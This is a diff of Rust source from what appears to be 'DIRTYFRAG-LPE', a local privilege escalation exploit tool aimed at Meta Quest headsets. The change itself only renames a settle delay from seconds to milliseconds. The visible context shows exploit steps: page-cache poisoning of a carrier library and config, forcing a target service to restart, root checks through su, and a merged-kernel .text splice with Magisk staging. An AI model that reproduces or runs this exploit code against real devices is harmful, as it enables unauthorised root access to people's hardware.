@@ -128,8 +128,8 @@ fn push_bytes(adb: &Adb, workdir: &Path, name: &str, bytes: &[u8], remote: &str)
 }
 
 // ============================== two-carrier flow (Quest 3 / 3S 5.10 non-merged) ==============================
-pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_root: bool, settle: u64, skip_magisk: bool) {
-    if t.merged() { return run_merged(t, device_override, cleanup, verify_root, settle, skip_magisk); }
+pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_root: bool, settle_ms: u64, skip_magisk: bool) {
+    if t.merged() { return run_merged(t, device_override, cleanup, verify_root, settle_ms, skip_magisk); }
     let workdir = make_workdir();
     banner(&format!("DIRTYFRAG-LPE   target: {}", t.s(&["name"])));
     info(&t.s(&["description"]));
@@ -199,8 +199,8 @@ pub fn run(t: &Target, device_override: Option<&str>, cleanup: Cleanup, verify_r
     for _ in 0..60 { ms(300); pid1 = adb.sh(&format!("pidof {}", tsvc)); if !pid1.is_empty() && pid1 != pid0 { break; } }
     if pid1 == pid0 || pid1.is_empty() { stager.stop(); die(&format!("{} did not restart (pid still {}) — dump stub not hit", tsvc, pid0)); }
     ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
-    info(&format!("settling {}s for the ctor's carrier/cfg poison to complete", settle));
-    secs(settle);
+    info(&format!("settling {}ms for the ctor's carrier/cfg poison to complete", settle_ms));
+    ms(settle_ms);
     if verify_root {
         let csha = adb.su(&format!("sha1sum {}", t.s(&["carrier", "device_path"])));
         info(&format!("carrier page-cache sha (root check): {}…", &csha.chars().take(12).collect::<String>()));
@@ -333,7 +333,7 @@ fn stage_postex_assets(adb: &Adb, workdir: &Path) {
 }
 
 // ============================== merged flow (Quest Pro 4.19 / Q2 / Q3S .text-splice) ==============================
-pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _verify_root: bool, settle: u64, skip_magisk: bool) {
+pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _verify_root: bool, settle_ms: u64, skip_magisk: bool) {
     let workdir = make_workdir();
     banner(&format!("DIRTYFRAG-LPE (merged)   target: {}", t.s(&["name"])));
     info(&t.s(&["description"]));
@@ -437,8 +437,8 @@ pub fn run_merged(t: &Target, device_override: Option<&str>, cleanup: Cleanup, _
         return;
     }
     ok(&format!("{} restarted  pid {} -> {}", tsvc, pid0, pid1));
-    info(&format!("settling {}s for the ctor's carrier poison to complete", settle));
-    secs(settle);
+    info(&format!("settling {}ms for the ctor's carrier poison to complete", settle_ms));
+    ms(settle_ms);
 
     step("Reverting inject-lib + libandroid poison (ctor done; before module load)");
     do_revert(&adb, &workdir, &mut reverted);
